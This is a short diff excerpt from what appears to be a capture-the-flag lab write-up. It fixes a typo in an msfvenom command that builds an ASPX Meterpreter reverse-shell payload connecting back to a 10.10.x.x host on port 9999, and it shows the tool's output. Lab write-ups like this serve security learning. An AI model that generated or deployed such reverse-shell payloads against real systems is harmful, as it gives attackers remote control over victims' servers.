@@ -553,7 +553,7 @@ NOTE: THIS IS AN ALTERNATE METHOD AS SHOWN IN OFFICIAL WRITE-UP
 
 Let's generate a custom `.aspx` reverse shell. [(Source)](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
 ```
-msf5 > msfvenom -p .indows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
+msf5 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
 [*] exec: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=9999 -f aspx > devel.aspx
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
